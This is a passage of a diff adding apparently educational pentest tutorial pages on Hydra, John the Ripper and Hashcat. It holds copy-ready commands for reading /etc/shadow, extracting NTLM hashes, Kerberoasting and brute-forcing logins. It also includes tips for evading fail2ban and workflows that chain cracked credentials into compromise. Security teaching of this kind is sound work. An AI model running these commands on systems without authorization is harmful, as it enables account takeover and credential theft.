+                6. <strong>Save Progress:</strong> Hydra auto-saves, use <code>-R</code> to resume if interrupted<br><br>
+                
+                <strong>Real-World Workflow:</strong><br>
+                1. <strong>Enumerate services:</strong> <code>nmap -sV -p- target.com</code> (find SSH/FTP/RDP/etc.)<br>
+                2. <strong>Enumerate users:</strong> enum4linux, OSINT, email harvesting, SMB enumeration<br>
+                3. <strong>Test default creds:</strong> admin:admin, root:root, admin:password<br>
+                4. <strong>Try common patterns:</strong> <code>hydra -L users.txt -e nsr ssh://target</code><br>
+                5. <strong>Targeted wordlist:</strong> Company name variations, seasons+year (CompanyName2024, Winter2024)<br>
+                6. <strong>Escalate to rockyou:</strong> Only if targeted attacks fail<br>
+                7. <strong>Monitor & adjust:</strong> Check for lockouts, adjust <code>-t</code> and <code>-w</code> values<br><br>
+                
+                <strong>Pro Tips:</strong><br>
+                • FTP: Always try <code>anonymous:anonymous</code> first<br>
+                • SSH: Use <code>-t 4 -u</code> (4 connections, loop users) to avoid triggering fail2ban<br>
+                • RDP: EXTREME caution - use <code>-t 1 -u</code> (lockout policies are common!)<br>
+                • HTTP forms: Capture POST request in Burp, copy params, replace values with ^USER^ ^PASS^<br>
+                • SMB: Combine with CrackMapExec for better password spraying<br>
+                • Databases: Common users: MySQL=root, PostgreSQL=postgres, MSSQL=sa<br><br>
+                
+                <strong>Legal & Ethical:</strong> ONLY use Hydra on systems you own or have explicit written permission to test. Unauthorized brute-forcing is illegal and can cause service disruptions (DoS), account lockouts, and generate massive logs. Always get permission FIRST! 🔐</p>
+            </div>
+
+            <h4>John the Ripper (THE CPU Password Cracking Tool)</h4>
+
+            <p><strong>What is John the Ripper?</strong> John the Ripper (JtR) is a <strong>CPU-based password cracker</strong> that supports 400+ hash formats including MD5, SHA, NTLM, LM, bcrypt, Kerberos, WPA/WPA2, ZIP/RAR archives, PDF passwords, SSH keys, and more. It's been around since 1996 and is the gold standard for offline password cracking. Think of it as the "Swiss Army knife" of hash cracking!</p>
+            <p><strong>Why John?</strong> It's fast, supports TONS of formats, has intelligent cracking modes (single, wordlist, incremental), can use custom rules to generate password variations, and has conversion tools (zip2john, ssh2john, etc.) to extract hashes from files!</p>
+
+            <h5>Installation & Basic Usage</h5>
+            <div class="code">
+# John is pre-installed on Kali Linux<br>
+john --help<br><br>
+
+# Or install on other systems:<br>
+sudo apt install john&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
+brew install john&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>
+
+# Basic syntax:<br>
+john [options] hashfile</div>
+
+            <h5>Essential John Flags</h5>
+            <div class="code">
+# Cracking modes:<br>
+--single&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single crack mode (fast, uses username variations)<br>
+--wordlist=FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Wordlist mode (dictionary attack)<br>
+--incremental&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Incremental mode (brute-force)<br>
+--external=MODE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# External mode (custom algorithms)<br>
+--markov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Markov mode (statistical patterns)<br><br>
+
+# Hash format:<br>
+--format=FORMAT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Specify hash type (md5, sha256, ntlm, bcrypt, etc.)<br>
+--list=formats&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show all supported formats (400+!)<br>
+--list=format-details&nbsp;&nbsp;&nbsp;&nbsp;# Show detailed format info<br><br>
+
+# Wordlist enhancements:<br>
+--rules&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Apply transformation rules<br>
+--rules=RULENAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Use specific rule set<br><br>
+
+# Session management:<br>
+--session=NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Name session (for saving progress)<br>
+--restore=NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Restore saved session<br>
+--status=NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show session status<br><br>
+
+# Output options:<br>
+--show&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Show cracked passwords<br>
+--pot=FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Custom potfile location (cracked passwords)<br>
+--stdout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Output candidate passwords to stdout (for piping)<br><br>
+
+# Performance:<br>
+--fork=N&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Parallel processing (N = number of cores)<br>
+--node=MIN-MAX/TOTAL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Distributed cracking<br><br>
+
+# Encoding:<br>
+--encoding=TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Character encoding (utf-8, cp1252, etc.)</div>
+
+            <p><strong>Flag Explanations:</strong></p>
+            <ul>
+                <li><strong>--format:</strong> CRITICAL! Specifies hash type. Wrong format = no results. Use <code>--list=formats</code> to see all 400+ supported types</li>
+                <li><strong>--single:</strong> Fastest mode. Uses username to generate password guesses (john → john123, JOHN, john2024). Always try this first!</li>
+                <li><strong>--wordlist:</strong> Dictionary attack. Uses password list (rockyou.txt, custom wordlists)</li>
+                <li><strong>--incremental:</strong> Brute-force. Tries all combinations (a, aa, ab, ac...). SLOWEST but guaranteed to find password eventually</li>
+                <li><strong>--rules:</strong> Applies transformations to wordlist (capitalize, add numbers, leet speak). Multiplies wordlist effectiveness!</li>
+                <li><strong>--fork:</strong> Multi-core processing. Use <code>--fork=4</code> for 4 CPU cores (speeds up cracking significantly)</li>
+                <li><strong>--show:</strong> Display already cracked passwords from potfile</li>
+                <li><strong>--session:</strong> Save progress. If John is interrupted, you can resume with <code>--restore</code></li>
+            </ul>
+
+            <h5>Cracking Linux Passwords (Unshadow)</h5>
+            <div class="code">
+# Linux stores passwords in /etc/shadow (root only)<br>
+# User info is in /etc/passwd<br>
+# John needs BOTH files combined:<br><br>
+
+# Combine passwd + shadow files:<br>
+unshadow /etc/passwd /etc/shadow > hashes.txt<br><br>
+
+# Crack with single mode (fast):<br>
+john --single hashes.txt<br><br>
+
+# Crack with wordlist:<br>
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt<br><br>
+
+# Crack with rules (wordlist + transformations):<br>
+john --wordlist=rockyou.txt --rules hashes.txt<br><br>
+
+# Show cracked passwords:<br>
+john --show hashes.txt<br><br>
+
+# Incremental mode (brute-force):<br>
+john --incremental hashes.txt</div>
+            <p><strong>Real-World Use:</strong> During pentests, if you get root access, grab /etc/passwd and /etc/shadow, combine with unshadow, crack offline. Common in CTFs!</p>
+
+            <h5>Cracking Windows Passwords (NTLM)</h5>
+            <div class="code">
+# Windows passwords stored as NTLM hashes<br>
+# Extract with secretsdump.py (Impacket) or mimikatz<br><br>
+
+# NTLM hash format: username:RID:LM:NTLM:::<br>
+# Example: Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::<br><br>
+
+# Crack NTLM hashes:<br>
+john --format=nt ntlm_hashes.txt<br><br>
+
+# With wordlist + rules:<br>
+john --format=nt --wordlist=rockyou.txt --rules ntlm_hashes.txt<br><br>
+
+# Show cracked:<br>
+john --format=nt --show ntlm_hashes.txt<br><br>
+
+# LM hashes (older Windows, very weak):<br>
+john --format=lm lm_hashes.txt</div>
+            <p><strong>NTLM vs LM:</strong> LM hashes are VERY weak (max 14 chars, uppercase only, split into 7-char chunks). NTLM is stronger but still vulnerable to brute-force and rainbow tables. Always crack LM first (seconds), then NTLM!</p>
+
+            <h5>List All Supported Formats</h5>
+            <div class="code">
+# Show ALL formats (400+):<br>
+john --list=formats<br><br>
+
+# Common formats:<br>
+md5crypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Linux /etc/shadow MD5<br>
+sha512crypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Linux /etc/shadow SHA-512<br>
+bcrypt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Linux /etc/shadow bcrypt<br>
+nt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Windows NTLM<br>
+lm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Windows LM (old)<br>
+mscash2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Windows cached credentials<br>
+krb5tgs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Kerberos TGS (Kerberoasting)<br>
+krb5asrep&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Kerberos AS-REP<br>
+raw-md5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Raw MD5 hash<br>
+raw-sha1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Raw SHA1<br>
+raw-sha256&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Raw SHA-256<br>
+zip&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ZIP file passwords<br>
+rar&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# RAR archive passwords<br>
+office&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MS Office documents<br>
+pdf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PDF passwords<br>
+ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SSH private keys<br>
+mysql-sha1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MySQL passwords<br>
+postgres&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PostgreSQL passwords<br>
+mssql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MSSQL passwords<br><br>
+
+# Search for specific format:<br>
+john --list=formats | grep -i ntlm<br>
+john --list=formats | grep -i kerberos</div>
+
+            <h5>Converting File Formats (xxx2john)</h5>
+            <div class="code">
+# John includes conversion tools to extract hashes from files:<br><br>
+
+# ZIP file passwords:<br>
+zip2john encrypted.zip > zip_hash.txt<br>
+john --wordlist=rockyou.txt zip_hash.txt<br><br>
+
+# RAR archive passwords:<br>
+rar2john encrypted.rar > rar_hash.txt<br>
+john rar_hash.txt<br><br>
+
+# SSH private key passphrases:<br>
+ssh2john id_rsa > ssh_hash.txt<br>
+john --wordlist=rockyou.txt ssh_hash.txt<br><br>
+
+# PDF passwords:<br>
+pdf2john encrypted.pdf > pdf_hash.txt<br>
+john pdf_hash.txt<br><br>
+
+# MS Office documents (Word, Excel, PowerPoint):<br>
+office2john document.docx > office_hash.txt<br>
+john office_hash.txt<br><br>
+
+# 7-Zip archives:<br>
+7z2john encrypted.7z > 7z_hash.txt<br>
+john 7z_hash.txt<br><br>
+
+# Encrypted Keepass databases:<br>
+keepass2john database.kdbx > keepass_hash.txt<br>
+john keepass_hash.txt<br><br>
+
+# TrueCrypt/VeraCrypt volumes:<br>
+truecrypt2john encrypted_volume > tc_hash.txt<br>
+john tc_hash.txt<br><br>
+
+# BitLocker encrypted drives:<br>
+bitlocker2john /dev/sdb1 > bitlocker_hash.txt<br>
+john bitlocker_hash.txt<br><br>
+
+# Mozilla Firefox/Thunderbird master passwords:<br>
+mozilla2john signons.sqlite > mozilla_hash.txt<br>
+john mozilla_hash.txt<br><br>
+
+# WPA/WPA2 WiFi handshakes:<br>
+# First capture handshake with aircrack-ng<br>
+wpa2john capture.pcap > wpa_hash.txt<br>
+john --wordlist=rockyou.txt wpa_hash.txt</div>
+            <p><strong>How it Works:</strong> xxx2john tools extract password hashes from encrypted files and convert them into John's format. Then John cracks the hash just like any other password!</p>
+
+            <h5>Cracking Kerberos Tickets (Kerberoasting)</h5>
+            <div class="code">
+# Kerberoasting attack (Active Directory):<br>
+# 1. Request Kerberos service tickets (with GetUserSPNs.py)<br>
+# 2. Extract and crack tickets offline<br><br>
+
+# Kerberos TGS tickets (Kerberoasting):<br>
+john --format=krb5tgs --wordlist=rockyou.txt kerberos_tickets.txt<br><br>
+
+# Kerberos AS-REP (AS-REP Roasting):<br>
+john --format=krb5asrep --wordlist=rockyou.txt asrep_hashes.txt<br><br>
+
+# With rules for faster cracking:<br>
+john --format=krb5tgs --wordlist=rockyou.txt --rules kerberos_tickets.txt</div>
+            <p><strong>Real-World Use:</strong> After Kerberoasting (GetUserSPNs.py), you get encrypted service tickets. Crack offline with John, then use credentials to access services or escalate privileges!</p>
+
+            <h5>Rule-Based Attacks</h5>
+            <div class="code">
+# Rules transform wordlist passwords (multiply effectiveness)<br>
+# Example: "password" becomes: Password, password123, p@ssword, PASSWORD, etc.<br><br>
+
+# Use default rules:<br>
+john --wordlist=rockyou.txt --rules hashes.txt<br><br>
+
+# Use specific rule set:<br>
+john --wordlist=rockyou.txt --rules=Jumbo hashes.txt<br><br>
+
+# List available rules:<br>
+john --list=rules<br><br>
+
+# Common rule sets:<br>
+--rules=Single&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Single mode rules (username variations)<br>
+--rules=Wordlist&nbsp;&nbsp;&nbsp;&nbsp;# Basic wordlist transformations<br>
+--rules=Jumbo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Comprehensive ruleset (JtR Jumbo)<br>
+--rules=KoreLogic&nbsp;&nbsp;# KoreLogic rules (very powerful)<br><br>
+
+# Custom rules (in john.conf):<br>
+# Rules syntax examples:<br>
+# c = Capitalize first letter (password → Password)<br>
+# u = Uppercase all (password → PASSWORD)<br>
+# l = Lowercase all (PASSWORD → password)<br>
+# $1 = Append "1" (password → password1)<br>
+# ^1 = Prepend "1" (password → 1password)<br>
+# sa@ = Replace "a" with "@" (password → p@ssword)<br>
+# [...]<br><br>
+
+# Generate candidates to stdout (preview rules):<br>
+john --wordlist=words.txt --rules --stdout | head -20</div>
+            <p><strong>Rule Power:</strong> Rules dramatically increase wordlist effectiveness. A 1000-word list with rules becomes 100,000+ candidates! Essential for cracking complex passwords!</p>
+
+            <h5>Incremental Mode (Brute-Force)</h5>
+            <div class="code">
+# Incremental mode = pure brute-force<br>
+# Tries all character combinations in order<br><br>
+
+# Default incremental (lowercase + digits):<br>
+john --incremental hashes.txt<br><br>
+
+# All printable ASCII characters:<br>
+john --incremental=ASCII hashes.txt<br><br>
+
+# Alphanumeric only:<br>
+john --incremental=Alnum hashes.txt<br><br>
+
+# Digits only (PIN codes):<br>
+john --incremental=Digits hashes.txt<br><br>
+
+# Custom character set (in john.conf):<br>
+john --incremental=Custom hashes.txt<br><br>
+
+# Limit length (faster):<br>
+# Edit john.conf: MinLen = 1, MaxLen = 8<br>
+john --incremental hashes.txt</div>
+            <p><strong>Performance Warning:</strong> Incremental mode is SLOW for long passwords! 8 chars = hours, 10 chars = days/weeks, 12+ chars = months/years. Only use for short passwords or as last resort!</p>
+
+            <h5>Session Management</h5>
+            <div class="code">
+# Save progress automatically:<br>
+john --session=mysession --wordlist=rockyou.txt hashes.txt<br><br>
+
+# Interrupt with Ctrl+C (John saves progress)<br><br>
+
+# Restore saved session:<br>
+john --restore=mysession<br><br>
+
+# Check session status:<br>
+john --status=mysession<br><br>
+
+# Default session name is "john" if not specified<br>
+john --restore&nbsp;&nbsp;# Restores default session</div>
+            <p><strong>Why Sessions?</strong> Cracking can take hours/days. Sessions let you pause, resume, check progress without losing work!</p>
+
+            <h5>Parallel Processing</h5>
+            <div class="code">
+# Use multiple CPU cores:<br>
+john --fork=4 --wordlist=rockyou.txt hashes.txt<br>
+# --fork=4 uses 4 cores<br><br>
+
+# Check number of cores:<br>
+nproc&nbsp;&nbsp;# Linux<br>
+sysctl -n hw.ncpu&nbsp;&nbsp;# macOS<br><br>
+
+# Distributed cracking (multiple machines):<br>
+# Machine 1 (1st quarter):<br>
+john --node=1-4/16 --wordlist=rockyou.txt hashes.txt<br><br>
+
+# Machine 2 (2nd quarter):<br>
+john --node=5-8/16 --wordlist=rockyou.txt hashes.txt<br><br>
+
+# Machine 3 (3rd quarter):<br>
+john --node=9-12/16 --wordlist=rockyou.txt hashes.txt<br><br>
+
+# Machine 4 (4th quarter):<br>
+john --node=13-16/16 --wordlist=rockyou.txt hashes.txt</div>
+            <p><strong>Distributed Cracking:</strong> Split work across multiple machines for MASSIVE speedup! Each machine cracks different portion of keyspace!</p>
+
+            <h5>Show Cracked Passwords</h5>
+            <div class="code">
+# Show cracked passwords:<br>
+john --show hashes.txt<br><br>
+
+# Show with specific format:<br>
+john --format=nt --show ntlm_hashes.txt<br><br>
+
+# Show only usernames:<br>
+john --show --users=0 hashes.txt<br><br>
+
+# Show with left uncracked:<br>
+john --show=left hashes.txt<br><br>
+
+# Potfile location (cracked passwords stored here):<br>
+~/.john/john.pot&nbsp;&nbsp;# Linux/Mac<br>
+%USERPROFILE%\.john\john.pot&nbsp;&nbsp;# Windows</div>
+
+            <div class="metaphor-box">
+                <p><strong>🎯 John the Ripper Mastery Summary:</strong></p>
+                <p><strong>Essential Commands:</strong><br>
+                • <strong>Linux passwords:</strong> <code>unshadow /etc/passwd /etc/shadow > hashes.txt</code> → <code>john --wordlist=rockyou.txt --rules hashes.txt</code><br>
+                • <strong>Windows NTLM:</strong> <code>john --format=nt --wordlist=rockyou.txt ntlm.txt</code><br>
+                • <strong>ZIP files:</strong> <code>zip2john file.zip > hash.txt</code> → <code>john hash.txt</code><br>
+                • <strong>SSH keys:</strong> <code>ssh2john id_rsa > hash.txt</code> → <code>john --wordlist=rockyou.txt hash.txt</code><br>
+                • <strong>Kerberoasting:</strong> <code>john --format=krb5tgs --wordlist=rockyou.txt tickets.txt</code><br>
+                • <strong>Show cracked:</strong> <code>john --show hashes.txt</code><br><br>
+                
+                <strong>Cracking Strategy (Try in Order):</strong><br>
+                1. <strong>Single mode:</strong> <code>john --single hashes.txt</code> (fastest, uses usernames)<br>
+                2. <strong>Wordlist:</strong> <code>john --wordlist=rockyou.txt hashes.txt</code><br>
+                3. <strong>Wordlist + Rules:</strong> <code>john --wordlist=rockyou.txt --rules hashes.txt</code> (10-100x more candidates)<br>
+                4. <strong>Incremental (brute-force):</strong> <code>john --incremental hashes.txt</code> (last resort, SLOW!)<br><br>
+                
+                <strong>Critical Flags:</strong><br>
+                • <code>--format=FORMAT</code>: Specify hash type (nt, md5crypt, bcrypt, krb5tgs, etc.)<br>
+                • <code>--wordlist=FILE</code>: Dictionary attack with password list<br>
+                • <code>--rules</code>: Apply transformation rules (HUGE performance boost!)<br>
+                • <code>--fork=N</code>: Use N CPU cores (4-8 cores = 4-8x faster)<br>
+                • <code>--session=NAME</code>: Save progress, resume with <code>--restore=NAME</code><br>
+                • <code>--show</code>: Display cracked passwords<br><br>
+                
+                <strong>Real-World Workflows:</strong><br>
+                • <strong>Linux compromise:</strong> Dump /etc/passwd + /etc/shadow → unshadow → crack with John → su to cracked users<br>
+                • <strong>Windows compromise:</strong> secretsdump.py → Extract NTLM → John cracking → Pass-the-Hash or legitimate login<br>
+                • <strong>Encrypted files:</strong> Find .zip/.rar/.7z → xxx2john → Crack → Extract sensitive data<br>
+                • <strong>SSH pivoting:</strong> Find id_rsa keys → ssh2john → Crack passphrase → SSH to other systems<br>
+                • <strong>Kerberoasting:</strong> GetUserSPNs.py → Dump tickets → John cracking → Service account compromise<br><br>
+                
+                <strong>Performance Tips:</strong><br>
+                • Always try <code>--single</code> first (seconds-minutes)<br>
+                • Use <code>--rules</code> with wordlists (10-100x more effective)<br>
+                • Use <code>--fork=N</code> for multi-core (linear speedup)<br>
+                • Start with small wordlists (top 1000), escalate to rockyou.txt<br>
+                • Save sessions (<code>--session</code>) for long cracks<br>
+                • Incremental mode = LAST RESORT (days/weeks for 10+ char passwords)<br><br>
+                
+                <strong>Common Hash Formats:</strong><br>
+                Linux: md5crypt, sha512crypt, bcrypt | Windows: nt, lm, mscash2 | Kerberos: krb5tgs, krb5asrep | Raw: raw-md5, raw-sha1, raw-sha256 | Files: zip, rar, office, pdf, ssh 🔐</p>
+            </div>
+
+            <h4>Hashcat (THE GPU Password Cracking Tool)</h4>
+
+            <p><strong>What is Hashcat?</strong> Hashcat is the world's <strong>fastest password cracker</strong> using GPU acceleration. It can leverage your graphics card (NVIDIA, AMD, Intel) to crack passwords 100-1000x faster than CPU-based tools! Supports 400+ hash algorithms including MD5, SHA, NTLM, bcrypt, WPA/WPA2, Kerberos, database hashes, and more. If John the Ripper is a bicycle, Hashcat is a Ferrari! 🏎️</p>
+            <p><strong>Why Hashcat?</strong> GPU parallelism = MASSIVE speed. A single high-end GPU can try billions of passwords per second for fast hashes (MD5, NTLM). Essential for cracking large password dumps, WPA handshakes, and modern hashes!</p>
+
+            <h5>Installation & GPU Setup</h5>
+            <div class="code">
+# Hashcat is pre-installed on Kali Linux<br>
+hashcat --help<br><br>
+
+# Or install on other systems:<br>
+sudo apt install hashcat&nbsp;&nbsp;&nbsp;&nbsp;# Debian/Ubuntu<br>
+brew install hashcat&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# macOS<br><br>
+
+# Check GPU availability:<br>
+hashcat -I<br>
+# Shows: NVIDIA, AMD, or Intel GPUs<br><br>
+
+# Benchmark your GPU:<br>
+hashcat -b<br>
+# Shows hash/s for each algorithm</div>
+            <p><strong>GPU Requirements:</strong> NVIDIA (CUDA), AMD (OpenCL), or Intel (OpenCL). Modern GPUs = faster. RTX 3090 can do 100+ GH/s for NTLM!</p>
+
+            <h5>Hash Modes (-m flag)</h5>
+            <div class="code">
+# Hashcat uses -m flag to specify hash type<br>
+# There are 400+ hash modes!<br><br>
+
+# Common hash modes:<br>
+-m 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MD5<br>
+-m 100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# SHA1<br>
+-m 1000&nbsp;&nbsp;&nbsp;&nbsp;# NTLM (Windows passwords)<br>
+-m 1800&nbsp;&nbsp;&nbsp;&nbsp;# Linux SHA-512 (/etc/shadow)<br>
+-m 3000&nbsp;&nbsp;&nbsp;&nbsp;# LM (old Windows)<br>
+-m 3200&nbsp;&nbsp;&nbsp;&nbsp;# bcrypt (Linux /etc/shadow)<br>
+-m 5600&nbsp;&nbsp;&nbsp;&nbsp;# NetNTLMv2<br>
+-m 13100&nbsp;&nbsp;&nbsp;# Kerberos TGS (Kerberoasting)<br>
+-m 18200&nbsp;&nbsp;&nbsp;# Kerberos AS-REP<br>
+-m 22000&nbsp;&nbsp;&nbsp;# WPA/WPA2 PMKID<br>
+-m 2500&nbsp;&nbsp;&nbsp;&nbsp;# WPA/WPA2 (old format)<br>
+-m 11600&nbsp;&nbsp;&nbsp;# 7-Zip<br>
+-m 13600&nbsp;&nbsp;&nbsp;# WinZip<br>
+-m 10400&nbsp;&nbsp;&nbsp;# PDF 1.1-1.3<br>
+-m 10500&nbsp;&nbsp;&nbsp;# PDF 1.4-1.6<br>
+-m 9400&nbsp;&nbsp;&nbsp;&nbsp;# MS Office 2007<br>
+-m 9500&nbsp;&nbsp;&nbsp;&nbsp;# MS Office 2010<br>
+-m 9600&nbsp;&nbsp;&nbsp;&nbsp;# MS Office 2013<br>
+-m 200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MySQL 4.1/5.x<br>
+-m 12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# PostgreSQL<br>
+-m 131&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MSSQL (2000)<br>
+-m 132&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# MSSQL (2005/2008/2012/2014/2016)<br><br>
+
+# List all hash modes:<br>
+hashcat --help | grep -i "Hash modes"<br><br>
+
+# Example hash format detection:<br>
+hashcat --identify hash.txt&nbsp;&nbsp;# Auto-detect hash type (if possible)</div>
+
+            <h5>Attack Modes (-a flag)</h5>
+            <div class="code">
+# Attack modes define how passwords are generated:<br><br>
+
+-a 0&nbsp;&nbsp;# Straight (wordlist attack)<br>
+-a 1&nbsp;&nbsp;# Combination (combine two wordlists)<br>
+-a 3&nbsp;&nbsp;# Brute-force (mask attack)<br>
+-a 6&nbsp;&nbsp;# Hybrid Wordlist + Mask<br>
+-a 7&nbsp;&nbsp;# Hybrid Mask + Wordlist</div>
+            <p><strong>Attack Mode Explanations:</strong></p>
+            <ul>
+                <li><strong>-a 0 (Straight):</strong> Use wordlist as-is (with optional rules). Most common!</li>
+                <li><strong>-a 1 (Combination):</strong> Combine words from two lists (word1+word2). Example: "dragon" + "ball" = "dragonball"</li>
+                <li><strong>-a 3 (Brute-force/Mask):</strong> Try all combinations matching pattern (?l=lowercase, ?u=uppercase, ?d=digit, ?s=special)</li>
+                <li><strong>-a 6 (Hybrid):</strong> Wordlist + mask. Example: wordlist "password" + mask "?d?d" = password00, password01, ..., password99</li>
+                <li><strong>-a 7 (Hybrid):</strong> Mask + wordlist. Example: mask "?d?d" + wordlist "password" = 00password, 01password, etc.</li>
+            </ul>
+
+            <h5>Straight Attack (Wordlist)</h5>
+            <div class="code">
+# Basic wordlist attack:<br>
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt<br>
+# -m 0 = MD5 hashes<br>
+# -a 0 = Straight attack<br>
+# hashes.txt = file with hashes (one per line)<br>
+# rockyou.txt = password wordlist<br><br>
+
+# NTLM (Windows) hashes:<br>
+hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt<br><br>
+
+# Linux SHA-512 hashes:<br>
+hashcat -m 1800 -a 0 shadow_hashes.txt rockyou.txt<br><br>
+
+# With rules (multiply wordlist effectiveness):<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule<br><br>
+
+# Multiple rule files (combined):<br>
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule -r leetspeak.rule</div>
+            <p><strong>Hash File Format:</strong> One hash per line (plain MD5/SHA/NTLM), or username:hash format for Linux shadow hashes</p>
+
+            <h5>Mask Attack (Brute-Force)</h5>
+            <div class="code">
+# Mask attack tries all combinations matching pattern<br>
+# Mask characters:<br>
+# ?l = lowercase (a-z)<br>
+# ?u = uppercase (A-Z)<br>
+# ?d = digit (0-9)<br>
+# ?h = hex (0-9a-f)<br>
+# ?H = hex uppercase (0-9A-F)<br>
+# ?s = special chars (!@#$%^&*...)<br>
+# ?a = all characters (?l?u?d?s)<br>
+# ?b = all 0x00-0xff bytes<br><br>
+
+# 8-char lowercase:<br>
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l<br><br>
+
+# 6-digit PIN:<br>
+hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d<br><br>
+
+# Password followed by 2 digits (password01, password02, etc.):<br>
